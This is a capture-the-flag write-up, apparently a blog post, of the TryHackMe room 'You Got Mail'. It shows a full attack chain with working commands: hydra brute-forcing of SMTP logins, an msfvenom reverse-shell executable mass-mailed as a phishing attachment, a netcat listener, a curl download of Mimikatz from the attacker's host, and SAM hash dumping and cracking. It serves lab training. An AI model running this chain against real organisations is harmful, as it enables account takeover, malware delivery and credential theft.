---
title: "TryHackMe: You Got Mail"
author: jaxafed
categories: [TryHackMe]
tags: [web, brute-force, hydra, cewl, phishing, post-exploitation]
render_with_liquid: false
media_subpath: /images/tryhackme_you_got_mail/
image:
  path: room_image.webp
---

**You Got Mail** started with basic enumeration to discover a list of email addresses and create a custom wordlist to find the password for one of them. We then used this account to send phishing emails to other discovered email addresses with an executable attachment to gain a shell. After obtaining a shell, we performed some post-exploitation to discover two passwords and complete the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/yougotmail){: .center }

## Initial Enumeration

### Nmap Scan

Starting with an `nmap` scan, we can see that, apart from some of the usual `Windows` services, there are also mail-related services running.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.118.67
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: NAMESPACE QUOTA CHILDREN IMAP4 CAPABILITY completed OK IMAP4rev1 RIGHTS=texkA0001 ACL IDLE SORT
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
...
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web Application

Along with the target, we are also given a website at `https://brownbrick.co/`, where we find a static site.

![Brownbrick Index](brownbrick_index.webp){: width="1200" height="600"}

Checking the **Our Team** section at `https://brownbrick.co/menu.html`, we can find a couple of email addresses.

![Brownbrick Menu](brownbrick_menu.webp){: width="1200" height="600"}

## Shell as wrohit

From the emails, we can create a wordlist as follows:

```
fstamatis@brownbrick.co
pcathrine@brownbrick.co
tchikondi@brownbrick.co
lhedvig@brownbrick.co
wrohit@brownbrick.co
oaurelius@brownbrick.co
```
{: file="emails.txt" }

Using the web application, we can also create a custom wordlist for passwords using `cewl`:

```console
$ cewl --lowercase https://brownbrick.co/ > passwords.txt
```

Using `hydra` to test these passwords against the email addresses we found, we are able to discover the password for the `lhedvig@brownbrick.co` email account:

```console
$ hydra -L emails.txt -P passwords.txt 10.10.118.67 smtp -s 587 -t 16
...
[587][smtp] host: 10.10.118.67   login: lhedvig@brownbrick.co   password: bricks
...
```

Now that we have valid credentials, we can use them to send emails to other users.

First, we create a reverse shell executable to use as an attachment with `msfvenom`:

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.22 LPORT=443 -f exe -o shell.exe
```

Then, using our email list, we can use `sendemail` to send emails with our executable as an attachment to the other users:

```console
$ for email in $(cat emails.txt); do sendemail -f "lhedvig@brownbrick.co" -t "$email" -u "test" -m "test" -a shell.exe -s 10.10.118.67:25 -xu "lhedvig@brownbrick.co" -xp "bricks"; done
```
{: .wrap }

With this, we can see that our executable is executed by one of the users, granting us a shell as `wrohit` and we can then read the flag located at `C:\Users\wrohit\Desktop\flag.txt`.

```
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.118.67] 49773
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Mail\Attachments>whoami
brick-mail\wrohit
C:\Mail\Attachments>type C:\Users\wrohit\Desktop\flag.txt
THM{[REDACTED]}
```

## Finding the Passwords

### Password of wrohit

At this point, since we are a member of the `Administrators` group, we can simply upload **Mimikatz** to the machine and use it to dump the hashes from the `SAM` registry as follows:

```
C:\ProgramData>curl http://10.11.72.22/mimikatz.exe -o mimikatz.exe
C:\ProgramData>.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
...
RID  : 000003f6 (1014)
User : wrohit
  Hash NTLM: 8458995f1d0a4b0c107fb8e23362c814
...
```

We can then use **[CrackStation](https://crackstation.net/)** to crack the hash and recover the password for the user.

![Crackstation One](crackstation_one.webp){: width="1000" height="100"}

> There are also many other ways we could have achieved the same goal. For example, we could also obtain the user's hash using the `sekurlsa::msv` module or directly retrieve the password using `sekurlsa::wdigest` instead of cracking the hash. Alternatively, in a scenario where we did not have permissions to run these modules, since we already have a shell as the `wrohit` user, we could have run **responder** on our machine and used the existing shell to force authentication to our server, capturing the hash for the user and cracking it.
{: .prompt-tip }

### Password for hMail Dashboard

Lastly, we are tasked with finding the password for the **hMailServer Administrator Dashboard**, which we can find in hashed form inside the `C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI` configuration file:

```
C:\>type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI"
...
[Security]
AdministratorPassword=5f4dcc3b5aa765d61d8327deb882cf99
...
```

Once again, using **[CrackStation](https://crackstation.net/)** to crack the hash, we can retrieve the password and complete the challenge.

![Crackstation Two](crackstation_two.webp){: width="1000" height="100"}

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>